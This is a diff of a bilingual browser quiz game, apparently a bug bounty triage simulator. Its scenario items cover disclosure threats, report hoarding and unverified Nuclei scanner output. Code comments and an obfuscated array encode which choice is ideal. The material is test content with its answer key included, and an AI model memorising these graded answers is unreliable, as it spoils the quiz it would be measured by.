+                ok: "Dim 11 満点 (6/6) は **30 秒〜2 分動画 × 機微 redact × 注釈 × descriptive filename × 重要 HTTP テキスト化**。BBR-Review が強調する **『動画より、payload を強調した一連のスクリーンショット』** は、開発担当者の追試効率と修正速度の双方に効きます。**実 PII 残置は Critical 違反** なので、即書き直し依頼が必須。",
+                tip: "**Tip:** Intigriti v1.3 禁止条項 **D. Real PII verification** をそのまま引用すると、レポーター側も納得しやすく、結果として再投稿の速度が上がります。",
               },
               en: {
-                ok:
-                  "Dim 11 awards full 6/6 for **30s–2min video × redaction × annotations × descriptive filenames × critical HTTP as text**. BBR-Review highlights that **\"a sequence of payload-annotated screenshots often beats a video\"** for both developer retesting and fix speed. **Real PII left visible = Critical violation**, requiring an immediate rewrite request.",
-                tip:
-                  "**Tip:** Quoting Intigriti v1.3's forbidden item **D. Real PII verification** by name often shortens the resubmission cycle.",
+                ok: 'Dim 11 awards full 6/6 for **30s–2min video × redaction × annotations × descriptive filenames × critical HTTP as text**. BBR-Review highlights that **"a sequence of payload-annotated screenshots often beats a video"** for both developer retesting and fix speed. **Real PII left visible = Critical violation**, requiring an immediate rewrite request.',
+                tip: "**Tip:** Quoting Intigriti v1.3's forbidden item **D. Real PII verification** by name often shortens the resubmission cycle.",
               },
             },
           },
@@ -2692,10 +2728,8 @@
                 "(Found 5 days ago — kept the Date Tested field stretched while waiting)",
             },
             context: {
-              ja:
-                "BBR-Review **override rule**: **Dim 12 = 0 → 即時 forced `Do not submit` + Critical 違反** 扱い。Disclosure threat（『24h で Twitter 公開』）は **Intigriti v1.3 禁止条項 F**、**48 時間超の hoarding** は **同 A** に該当。professional markdown（H3 + code block + 短文）が必須。",
-              en:
-                "BBR-Review **override rule**: **Dim 12 = 0 → forced `Do not submit` + Critical violation**. Disclosure threats (\"public on Twitter in 24h\") violate **Intigriti v1.3 item F**; **>48-hour hoarding** violates **item A**. Professional markdown (H3 + code blocks + short sentences) is mandatory.",
+              ja: "BBR-Review **override rule**: **Dim 12 = 0 → 即時 forced `Do not submit` + Critical 違反** 扱い。Disclosure threat（『24h で Twitter 公開』）は **Intigriti v1.3 禁止条項 F**、**48 時間超の hoarding** は **同 A** に該当。professional markdown（H3 + code block + 短文）が必須。",
+              en: 'BBR-Review **override rule**: **Dim 12 = 0 → forced `Do not submit` + Critical violation**. Disclosure threats ("public on Twitter in 24h") violate **Intigriti v1.3 item F**; **>48-hour hoarding** violates **item A**. Professional markdown (H3 + code blocks + short sentences) is mandatory.',
             },
             question: {
               ja: "BBR-Review override rule + Intigriti compliance を踏まえた triage 対応は？",
@@ -2704,24 +2738,18 @@
             choices: [
               {
                 // ○ near
-                ja:
-                  "Dim 12 = 0 として記録し、professional markdown への書き直しは依頼する。ただし **disclosure threat / 5 日 hoarding の取り下げ要求と program admin への escalate は実施しない**。",
-                en:
-                  "Record Dim 12 = 0 and request a professional markdown rewrite, but **don't push for retraction of the disclosure threat / 5-day hoarding, and don't escalate to program admin**.",
+                ja: "Dim 12 = 0 として記録し、professional markdown への書き直しは依頼する。ただし **disclosure threat / 5 日 hoarding の取り下げ要求と program admin への escalate は実施しない**。",
+                en: "Record Dim 12 = 0 and request a professional markdown rewrite, but **don't push for retraction of the disclosure threat / 5-day hoarding, and don't escalate to program admin**.",
               },
               {
                 // △ ordinary — override 無視
-                ja:
-                  "文体は荒いが脆弱性自体は本物なので、Dim 12 を 5 点減点だけ適用してそのまま受理する（**override rule を無視**）。",
-                en:
-                  "The tone is rough but the bug is real, so apply a 5-point Dim 12 deduction and accept anyway (**ignoring the override rule**).",
+                ja: "文体は荒いが脆弱性自体は本物なので、Dim 12 を 5 点減点だけ適用してそのまま受理する（**override rule を無視**）。",
+                en: "The tone is rough but the bug is real, so apply a 5-point Dim 12 deduction and accept anyway (**ignoring the override rule**).",
               },
               {
                 // ◎ ideal
-                ja:
-                  "**Dim 12 = 0 override** 発動：**forced `Do not submit`** で triage を一旦停止。レポーターに (a) **disclosure threat（『24h で Twitter 公開』）の文章撤回**、(b) **48 時間超 hoarding（Intigriti v1.3 item A）の説明**、(c) **professional markdown（`### Issue` / `### Steps` / `### Impact` / `### Fix` + コードブロック + 短文）への書き直し** を依頼。**program admin に同時 escalate** し、CoC 違反扱いの可否を判断してもらう。",
-                en:
-                  "Trigger the **Dim 12 = 0 override**: pause triage with **forced `Do not submit`**. Ask the reporter for (a) **retraction of the disclosure threat (\"public on Twitter in 24h\")**, (b) **explanation of the >48-hour hoarding (Intigriti v1.3 item A)**, (c) **rewrite into professional markdown** (`### Issue` / `### Steps` / `### Impact` / `### Fix` + code blocks + short sentences). **Escalate to program admin** in parallel for a CoC-violation decision.",
+                ja: "**Dim 12 = 0 override** 発動：**forced `Do not submit`** で triage を一旦停止。レポーターに (a) **disclosure threat（『24h で Twitter 公開』）の文章撤回**、(b) **48 時間超 hoarding（Intigriti v1.3 item A）の説明**、(c) **professional markdown（`### Issue` / `### Steps` / `### Impact` / `### Fix` + コードブロック + 短文）への書き直し** を依頼。**program admin に同時 escalate** し、CoC 違反扱いの可否を判断してもらう。",
+                en: 'Trigger the **Dim 12 = 0 override**: pause triage with **forced `Do not submit`**. Ask the reporter for (a) **retraction of the disclosure threat ("public on Twitter in 24h")**, (b) **explanation of the >48-hour hoarding (Intigriti v1.3 item A)**, (c) **rewrite into professional markdown** (`### Issue` / `### Steps` / `### Impact` / `### Fix` + code blocks + short sentences). **Escalate to program admin** in parallel for a CoC-violation decision.',
               },
               {
                 // × far
@@ -2729,26 +2757,24 @@
                 en: "Pay the full bounty immediately to defuse the 24-hour threat.",
               },
             ],
-            kinds: ["near", "ordinary", "ideal", "far"],
             ex: {
               ja: {
-                ok:
-                  "Dim 12 = 0 と Dim 13 ≤ 5 は BBR-Review における **override rule** で、合計点に関わらず即 forced `Do not submit`。**脅迫に屈して支払うのは program 全体への悪い学習** で、悪意あるレポーターを増殖させます。文体改善依頼と CoC エスカレーションは別レーンで並行する。",
-                tip:
-                  "**Tip:** **48 時間 hoarding (Intigriti v1.3 item A)** は『Date Tested』フィールドと提出日時の差分で機械的に検出できます。レポーター文中の『I'll hold a bit longer before submitting』も signal。",
+                ok: "Dim 12 = 0 と Dim 13 ≤ 5 は BBR-Review における **override rule** で、合計点に関わらず即 forced `Do not submit`。**脅迫に屈して支払うのは program 全体への悪い学習** で、悪意あるレポーターを増殖させます。文体改善依頼と CoC エスカレーションは別レーンで並行する。",
+                tip: "**Tip:** **48 時間 hoarding (Intigriti v1.3 item A)** は『Date Tested』フィールドと提出日時の差分で機械的に検出できます。レポーター文中の『I'll hold a bit longer before submitting』も signal。",
               },
               en: {
-                ok:
-                  "Dim 12 = 0 and Dim 13 ≤ 5 are BBR-Review **override rules** — both force `Do not submit` regardless of total. **Paying to defuse a threat trains malicious reporters across the program**. Run the rewrite request and the CoC escalation in parallel lanes.",
-                tip:
-                  "**Tip:** **48-hour hoarding (Intigriti v1.3 item A)** is mechanically detectable via the *Date Tested* field minus submission timestamp. Phrases like \"I'll hold a bit longer before submitting\" are another signal.",
+                ok: "Dim 12 = 0 and Dim 13 ≤ 5 are BBR-Review **override rules** — both force `Do not submit` regardless of total. **Paying to defuse a threat trains malicious reporters across the program**. Run the rewrite request and the CoC escalation in parallel lanes.",
+                tip: '**Tip:** **48-hour hoarding (Intigriti v1.3 item A)** is mechanically detectable via the *Date Tested* field minus submission timestamp. Phrases like "I\'ll hold a bit longer before submitting" are another signal.',
               },
             },
           },
 
           /* --- 13. Quality Contamination (10pt) — override rule axis --- */
           {
-            tag: { ja: "13 · Quality Contamination", en: "13 · Quality Contamination" },
+            tag: {
+              ja: "13 · Quality Contamination",
+              en: "13 · Quality Contamination",
+            },
             dim: { ja: "品質汚染チェック", en: "Quality Contamination" },
             weight: 10,
             section: { ja: "Submission Body", en: "Submission Body" },
@@ -2765,10 +2791,8 @@
                 "(Nuclei template output pasted verbatim — no manual verification, no impact assessment, no further PoC)",
             },
             context: {
-              ja:
-                "BBR-Review **override rule**: **Dim 13 ≤ 5 → forced `Do not submit`**。Scanner-dump signals (6) のうち本件は #3 (`[critical] [http]` ヘッダ + Nuclei template path) と #4 (手動再現なし) を直撃。Intigriti v1.3 は『PoC must demonstrate exploitation possibility beyond doubt using the simplest method』を明文化。**HackerOne の Hai Triage (2025) は AI/低品質を pre-filter** し、curl の Daniel Stenberg は『時間泥棒 AI レポート』対策手順を公開、**Nextcloud は AI レポート急増を理由に bug bounty を 2026/04 終了**。",
-              en:
-                "BBR-Review **override rule**: **Dim 13 ≤ 5 → forced `Do not submit`**. Among the 6 scanner-dump signals, this hits #3 (`[critical] [http]` headers + Nuclei template path) and #4 (no manual reproduction). Intigriti v1.3 codifies: \"PoC must demonstrate exploitation possibility beyond doubt using the simplest method.\" Context: **HackerOne Hai Triage (2025) AI-pre-filters low-effort noise**; curl's Daniel Stenberg published anti-\"time-thief AI\" workflows; **Nextcloud ended its bug bounty program in April 2026** citing AI-report surge.",
+              ja: "BBR-Review **override rule**: **Dim 13 ≤ 5 → forced `Do not submit`**。Scanner-dump signals (6) のうち本件は #3 (`[critical] [http]` ヘッダ + Nuclei template path) と #4 (手動再現なし) を直撃。Intigriti v1.3 は『PoC must demonstrate exploitation possibility beyond doubt using the simplest method』を明文化。**HackerOne の Hai Triage (2025) は AI/低品質を pre-filter** し、curl の Daniel Stenberg は『時間泥棒 AI レポート』対策手順を公開、**Nextcloud は AI レポート急増を理由に bug bounty を 2026/04 終了**。",
+              en: 'BBR-Review **override rule**: **Dim 13 ≤ 5 → forced `Do not submit`**. Among the 6 scanner-dump signals, this hits #3 (`[critical] [http]` headers + Nuclei template path) and #4 (no manual reproduction). Intigriti v1.3 codifies: "PoC must demonstrate exploitation possibility beyond doubt using the simplest method." Context: **HackerOne Hai Triage (2025) AI-pre-filters low-effort noise**; curl\'s Daniel Stenberg published anti-"time-thief AI" workflows; **Nextcloud ended its bug bounty program in April 2026** citing AI-report surge.',
             },
             question: {
               ja: "BBR-Review Dim 13 + 各社の最新 anti-AI/scanner ポリシーに沿った triage は？",
@@ -2777,46 +2801,33 @@
             choices: [
               {
                 // △ ordinary — override 無視
-                ja:
-                  "Nuclei は信頼できる検出器なので、そのまま受理して満額の報奨金を支払う。",
-                en:
-                  "Accept as-is at full bounty — Nuclei is a reputable detector.",
+                ja: "Nuclei は信頼できる検出器なので、そのまま受理して満額の報奨金を支払う。",
+                en: "Accept as-is at full bounty — Nuclei is a reputable detector.",
               },
               {
                 // ◎ ideal — verify substance + ask for form rewrite + cite policy
-                ja:
-                  "**手動検証 first**: `/.git/config` に curl で実アクセスし露出を確認。本物なら漏洩する具体物（refs / authors / `git clone` 経由でのソース全体取得可否）を **手動 PoC で再構成** するよう依頼し、Nuclei 生出力フォーマット（`[critical] [http]` ヘッダ + template path）は **scanner-dump signal #3** + **#4 (manual reproduction 欠如)** として明示。Intigriti v1.3『PoC must demonstrate exploitation possibility beyond doubt using the simplest method』を引用。手動再構成があれば受理、無ければ **Dim 13 ≤ 5 override で forced `Do not submit`**。",
-                en:
-                  "**Manual verification first** — curl `/.git/config` yourself. If exposure is real, request a **manually-reconstructed PoC** showing what's actually leaked (refs / authors / whether `git clone` works via pack files). Flag the Nuclei output format (`[critical] [http]` header + template path) as **scanner-dump signal #3** + **#4 (no manual reproduction)**. Quote Intigriti v1.3: *\"PoC must demonstrate exploitation possibility beyond doubt using the simplest method.\"* Accept if a manual rebuild lands; otherwise **Dim 13 ≤ 5 override → forced `Do not submit`**.",
+                ja: "**手動検証 first**: `/.git/config` に curl で実アクセスし露出を確認。本物なら漏洩する具体物（refs / authors / `git clone` 経由でのソース全体取得可否）を **手動 PoC で再構成** するよう依頼し、Nuclei 生出力フォーマット（`[critical] [http]` ヘッダ + template path）は **scanner-dump signal #3** + **#4 (manual reproduction 欠如)** として明示。Intigriti v1.3『PoC must demonstrate exploitation possibility beyond doubt using the simplest method』を引用。手動再構成があれば受理、無ければ **Dim 13 ≤ 5 override で forced `Do not submit`**。",
+                en: '**Manual verification first** — curl `/.git/config` yourself. If exposure is real, request a **manually-reconstructed PoC** showing what\'s actually leaked (refs / authors / whether `git clone` works via pack files). Flag the Nuclei output format (`[critical] [http]` header + template path) as **scanner-dump signal #3** + **#4 (no manual reproduction)**. Quote Intigriti v1.3: *"PoC must demonstrate exploitation possibility beyond doubt using the simplest method."* Accept if a manual rebuild lands; otherwise **Dim 13 ≤ 5 override → forced `Do not submit`**.',
               },
               {
                 // ○ near — form rewrite だけ依頼、substance verification を省略
-                ja:
-                  "Nuclei 生出力をそのまま削除して **markdown に整形して再投稿** するよう依頼するが、**`/.git/config` への手動検証は triager 側で行わず、漏洩物の具体 PoC 再構成も求めない**（form だけ直して中身を確認しない）。",
-                en:
-                  "Ask the reporter to **strip the Nuclei output and reformat as markdown**, but **don't manually verify `/.git/config` yourself or require a manual PoC rebuild** (form rewrite without substance verification).",
+                ja: "Nuclei 生出力をそのまま削除して **markdown に整形して再投稿** するよう依頼するが、**`/.git/config` への手動検証は triager 側で行わず、漏洩物の具体 PoC 再構成も求めない**（form だけ直して中身を確認しない）。",
+                en: "Ask the reporter to **strip the Nuclei output and reformat as markdown**, but **don't manually verify `/.git/config` yourself or require a manual PoC rebuild** (form rewrite without substance verification).",
               },
               {
                 // × far
-                ja:
-                  "Nuclei 使用時点で N/A クローズ＋スパムとしてレポーターを永久 BAN（手動検証なし）。",
-                en:
-                  "Close as N/A and permanently ban the reporter purely for using Nuclei (no manual verification).",
+                ja: "Nuclei 使用時点で N/A クローズ＋スパムとしてレポーターを永久 BAN（手動検証なし）。",
+                en: "Close as N/A and permanently ban the reporter purely for using Nuclei (no manual verification).",
               },
             ],
-            kinds: ["ordinary", "ideal", "near", "far"],
             ex: {
               ja: {
-                ok:
-                  "Dim 13 の鉄則は **『中身は triager 自身で手動検証 → 形式のみ書き直しを依頼』** という substance/form 分離。**Dim 13 ≤ 5 override** が走るのは『中身が手動再現不能 + 形式が scanner-dump』の AND 条件。HackerOne CoC（2025-26）も AI 利用自体は禁止していないが、**hallucination・technical inaccuracy・low-effort noise を spam として明示的にペナルティ** 対象に追加しています。",
-                tip:
-                  "**Tip:** スキャナ出力をそのまま採点したくなる気持ちを抑え、**『scanner findings ≠ vulnerabilities, until manually verified』** を毎回思い出しましょう。BBR-Review の examples では Nuclei dump 4 件詰めの報告が **8/100 = Do not submit + Reputation risk** とスコアされています。",
+                ok: "Dim 13 の鉄則は **『中身は triager 自身で手動検証 → 形式のみ書き直しを依頼』** という substance/form 分離。**Dim 13 ≤ 5 override** が走るのは『中身が手動再現不能 + 形式が scanner-dump』の AND 条件。HackerOne CoC（2025-26）も AI 利用自体は禁止していないが、**hallucination・technical inaccuracy・low-effort noise を spam として明示的にペナルティ** 対象に追加しています。",
+                tip: "**Tip:** スキャナ出力をそのまま採点したくなる気持ちを抑え、**『scanner findings ≠ vulnerabilities, until manually verified』** を毎回思い出しましょう。BBR-Review の examples では Nuclei dump 4 件詰めの報告が **8/100 = Do not submit + Reputation risk** とスコアされています。",
               },
               en: {
-                ok:
-                  "Dim 13's rule is **substance/form separation** — the triager manually verifies the *substance* and only requests a *form* rewrite. The **Dim 13 ≤ 5 override** fires when manual reproduction is impossible AND the form is scanner-dump. HackerOne's CoC (2025–26) doesn't ban AI itself but **explicitly penalizes hallucinations, technical inaccuracy, and low-effort noise as spam**.",
-                tip:
-                  "**Tip:** Resist scoring scanner output directly. Remember **\"scanner findings ≠ vulnerabilities, until manually verified.\"** BBR-Review's examples score a 4-finding Nuclei dump at **8/100 = Do not submit + reputation risk**.",
+                ok: "Dim 13's rule is **substance/form separation** — the triager manually verifies the *substance* and only requests a *form* rewrite. The **Dim 13 ≤ 5 override** fires when manual reproduction is impossible AND the form is scanner-dump. HackerOne's CoC (2025–26) doesn't ban AI itself but **explicitly penalizes hallucinations, technical inaccuracy, and low-effort noise as spam**.",
+                tip: '**Tip:** Resist scoring scanner output directly. Remember **"scanner findings ≠ vulnerabilities, until manually verified."** BBR-Review\'s examples score a 4-finding Nuclei dump at **8/100 = Do not submit + reputation risk**.',
               },
             },
           },
@@ -2833,12 +2844,27 @@
           return _ANS_ENC[qIdx] ^ (((qIdx * 5 + 13) | 0) & 3);
         }
 
+        // kinds 配列を 1 バイトにパックし、qIdx 依存マスクで軽く難読化
+        // （SCENARIOS から ideal の位置を View Source で直読みされないように）
+        // 0=ideal, 1=near, 2=ordinary, 3=far の 2bit を 4 個並べた値
+        const _KIND_ENC = [
+          227, 243, 252, 204, 180, 218, 42, 181, 153, 163, 148, 73, 89,
+        ];
+        const _KIND_NAMES = ["ideal", "near", "ordinary", "far"];
+        function _kindAt(qIdx, choiceIdx) {
+          const raw = _KIND_ENC[qIdx] ^ (((qIdx * 11 + 7) | 0) & 0xff);
+          return _KIND_NAMES[(raw >> (choiceIdx * 2)) & 0x3];
+        }
+
         /* =========================================================
            状態
            ========================================================= */
         let lang = "ja";
         try {
-          const stored = localStorage.getItem("triage_sim_lang");
+          // 全ゲーム共通キー mk12_game_lang を優先、旧キー triage_sim_lang から移行も読む
+          const stored =
+            localStorage.getItem("mk12_game_lang") ||
+            localStorage.getItem("triage_sim_lang");
           if (stored === "ja" || stored === "en") lang = stored;
         } catch (e) {}
 
@@ -2881,8 +2907,9 @@
         function applyI18n() {
           document.documentElement.lang = lang;
           document.title =
-            (lang === "ja" ? "トリアージ・シミュレーション" : "Bug Bounty Triage Simulator") +
-            " | morioka12 game site";
+            (lang === "ja"
+              ? "トリアージ・シミュレーション"
+              : "Bug Bounty Triage Simulator") + " | morioka12 game site";
           document.getElementById("brand-name").textContent = t("brandName");
           document.getElementById("hero-tag-text").textContent = t("heroTag");
 
@@ -2890,10 +2917,12 @@
           heroTitle.textContent = t("heroTitle");
 
           document.getElementById("hero-sub").textContent = t("heroSub");
-          document.getElementById("stat-label-axes").textContent = t("statAxes");
+          document.getElementById("stat-label-axes").textContent =
+            t("statAxes");
           document.getElementById("stat-label-points").textContent =
             t("statPoints");
-          document.getElementById("stat-label-time").textContent = t("statTime");
+          document.getElementById("stat-label-time").textContent =
+            t("statTime");
           document.getElementById("stat-label-format").textContent =
             t("statFormat");
 
@@ -2914,13 +2943,13 @@
           document.getElementById("report-flag-text").textContent =
             t("reportFlag");
 
-          document.getElementById("score-suffix").textContent = t("scoreSuffix");
+          document.getElementById("score-suffix").textContent =
+            t("scoreSuffix");
           document.getElementById("stat-lbl-correct").textContent =
             t("statLblCorrect");
           document.getElementById("stat-lbl-wrong").textContent =
             t("statLblWrong");
-          document.getElementById("stat-lbl-pct").textContent =
-            t("statLblPct");
+          document.getElementById("stat-lbl-pct").textContent = t("statLblPct");
           document.getElementById("btn-share-text").textContent =
             t("resultShare");
           document.getElementById("btn-retry-text").textContent =
@@ -2949,14 +2978,12 @@
           if (lang === next) return;
           lang = next;
           try {
-            localStorage.setItem("triage_sim_lang", lang);
+            localStorage.setItem("mk12_game_lang", lang);
           } catch (e) {}
           applyI18n();
           updateLangPill();
           if (
-            document
-              .getElementById("screen-quiz")
-              .classList.contains("active")
+            document.getElementById("screen-quiz").classList.contains("active")
           ) {
             renderScenario();
           }
@@ -2973,11 +3000,9 @@
            画面切替
            ========================================================= */
         function showScreen(id) {
-          document
-            .querySelectorAll(".screen")
-            .forEach(function (s) {
-              s.classList.remove("active");
-            });
+          document.querySelectorAll(".screen").forEach(function (s) {
+            s.classList.remove("active");
+          });
           document.getElementById(id).classList.add("active");
           window.scrollTo({ top: 0, behavior: "smooth" });
         }
@@ -3133,13 +3158,13 @@
             }
             // 既存の choice-text の前に「種別ラベル」を差し込んで
             // 4 段階のグラデーション（◎/○/△/×）を可視化する
-            if (item.kinds && item.kinds[idx]) {
+            const kind = _kindAt(qIndex, idx);
+            if (kind) {
               const txt = b.querySelector(".choice-text");
               if (txt && !txt.querySelector(".choice-kind")) {
                 const kindEl = document.createElement("span");
-                kindEl.className =
-                  "choice-kind kind-" + item.kinds[idx];
-                kindEl.textContent = kindLabel(item.kinds[idx], lang);
+                kindEl.className = "choice-kind kind-" + kind;
+                kindEl.textContent = kindLabel(kind, lang);
                 txt.insertBefore(kindEl, txt.firstChild);
               }
             }
@@ -3165,9 +3190,7 @@
           const pts = document.createElement("span");
           pts.className = "feedback-points";
           pts.textContent = "+ " + earned + " / " + item.weight + " pt";
-          pts.style.color = isCorrect
-            ? "var(--success)"
-            : "var(--danger)";
+          pts.style.color = isCorrect ? "var(--success)" : "var(--danger)";
           title.appendChild(pts);
           fb.appendChild(title);
 
@@ -3192,6 +3215,21 @@
             qIndex >= SCENARIOS.length - 1 ? t("quizLast") : t("quizNext");
           nextBtn.style.display = "flex";
           nextBtn.onclick = onNext;
+          /* focus-next-btn-after-answer */
+          {
+            const _ae = document.activeElement;
+            const _aeChoice =
+              _ae && _ae.classList && _ae.classList.contains("choice");
+            if (!_ae || _ae === document.body || _aeChoice) {
+              requestAnimationFrame(function () {
+                try {
+                  nextBtn.focus({ preventScroll: false });
+                } catch (e) {
+                  nextBtn.focus();
+                }
+              });
+            }
+          }
         }
 
         function onNext() {
@@ -3211,8 +3249,20 @@
           showScreen("screen-result");
         }
 
+        // BBR-Review の override rule：Dim 12 = 0 / Dim 13 ≤ 5 で強制 "Do not submit"
+        // 戻り値：null（発動なし）/ "dim12" / "dim13"
+        function detectOverride() {
+          const a12 = answers[11]; // Dim 12 · Tone & Formatting（10pt）
+          const a13 = answers[12]; // Dim 13 · Quality Contamination（10pt）
+          if (a12 && (a12.earned || 0) === 0) return "dim12";
+          if (a13 && (a13.earned || 0) <= 5) return "dim13";
+          return null;
+        }
+
         // BBR-Review の 5 readiness band（share/<key>/ パスにも使う）
+        // override 発動時は合計に関わらず "do-not-submit" を返す
         function getRankKey(score) {
+          if (detectOverride()) return "do-not-submit";
           if (score >= 90) return "submit-ready";
           if (score >= 75) return "almost-ready";
           if (score >= 60) return "needs-work";
@@ -3309,6 +3359,24 @@
           document.getElementById("stat-pct").textContent = pct + "%";
           renderInline(document.getElementById("result-comment"), rank.comment);
 
+          // override rule 発動時は理由を表示し、合計点だけでは判定が変わらないことを明示する
+          const overrideKind = detectOverride();
+          const overrideEl = document.getElementById("result-override-notice");
+          if (overrideKind) {
+            overrideEl.style.display = "block";
+            renderInline(
+              overrideEl,
+              t(
+                overrideKind === "dim12"
+                  ? "overrideNoticeDim12"
+                  : "overrideNoticeDim13",
+              ),
+            );
+          } else {
+            overrideEl.style.display = "none";
+            overrideEl.textContent = "";
+          }
+
           const reviewGrid = document.getElementById("review-grid");
           reviewGrid.textContent = "";
           const keys = ["A", "B", "C", "D"];
@@ -3345,19 +3413,11 @@
               aLine.className = "review-a";
               const yourTag = document.createElement("span");
               yourTag.className = "review-a-tag";
-              yourTag.style.color = isOk
-                ? "var(--success)"
-                : "var(--danger)";
-              const yourKind =
-                item.kinds && item.kinds[ans.selected]
-                  ? " " + kindGlyph(item.kinds[ans.selected])
-                  : "";
+              yourTag.style.color = isOk ? "var(--success)" : "var(--danger)";
+              const _selKind = _kindAt(i, ans.selected);
+              const yourKind = _selKind ? " " + kindGlyph(_selKind) : "";
               yourTag.textContent =
-                "[" +
-                t("resultYour") +
-                "] " +
-                keys[ans.selected] +
-                yourKind;
+                "[" + t("resultYour") + "] " + keys[ans.selected] + yourKind;
               aLine.appendChild(yourTag);
               const yourText = document.createElement("span");
               renderInline(yourText, item.choices[ans.selected][lang]);
@@ -3444,8 +3504,8 @@
           const text = buildShareText(earned, total, pct, rankKey);
           // share/<rank-key>/index.html は事前に静的生成されている。
           // OGP がランクごとに焼かれるため X のカードもランク別になる。
-          const base = location.href.split("#")[0].replace(/[^/]*$/, "");
-          const url = base + "share/" + rankKey + "/";
+          // new URL の相対パス解決でドット入りディレクトリ名や /index.html 直指定にも安全。
+          const url = new URL("share/" + rankKey + "/", location.href).href;
           const intent =
             "https://x.com/intent/tweet?text=" +
             encodeURIComponent(text) +
@@ -3457,11 +3517,13 @@
         /* =========================================================
            イベントバインド
            ========================================================= */
-        document.querySelectorAll(".lang-toggle button").forEach(function (btn) {
-          btn.addEventListener("click", function () {
-            setLanguage(btn.dataset.lang);
+        document
+          .querySelectorAll(".lang-toggle button")
+          .forEach(function (btn) {
+            btn.addEventListener("click", function () {
+              setLanguage(btn.dataset.lang);
+            });
           });
-        });
         document
           .getElementById("btn-start")
           .addEventListener("click", startQuiz);
@@ -3533,6 +3595,40 @@
            ========================================================= */
         applyI18n();
         requestAnimationFrame(updateLangPill);
+        /* ===== Quiz keyboard shortcuts (1-4 / A-D / Enter) ===== */
+        document.addEventListener("keydown", function (_kbEvt) {
+          if (_kbEvt.isComposing || _kbEvt.keyCode === 229) return;
+          const _tg = _kbEvt.target;
+          if (_tg && /^(INPUT|TEXTAREA|SELECT)$/i.test(_tg.tagName)) return;
+          // quiz 画面がアクティブな時のみ反応する
+          const _scr = document.querySelector("#screen-quiz.active");
+          if (!_scr) return;
+          // Enter / Space で「次へ」ボタンを進める
+          if (
+            _kbEvt.key === "Enter" ||
+            _kbEvt.key === " " ||
+            _kbEvt.code === "Space"
+          ) {
+            const _nb = document.getElementById("btn-next");
+            if (_nb && _nb.style.display !== "none" && !_nb.disabled) {
+              _kbEvt.preventDefault();
+              _nb.click();
+            }
+            return;
+          }
+          // 1-4 / A-D で choice を選択（disabled なら無視）
+          let _idx = -1;
+          if (/^[1-4]$/.test(_kbEvt.key)) _idx = parseInt(_kbEvt.key, 10) - 1;
+          else if (/^[a-dA-D]$/.test(_kbEvt.key))
+            _idx = _kbEvt.key.toUpperCase().charCodeAt(0) - 65;
+          if (_idx < 0) return;
+          const _btns = _scr.querySelectorAll(".choice");
+          if (_btns[_idx] && !_btns[_idx].disabled) {
+            _kbEvt.preventDefault();
+            _btns[_idx].click();
+          }
+        });
+
         window.addEventListener("resize", updateLangPill);
       })();
     </script>
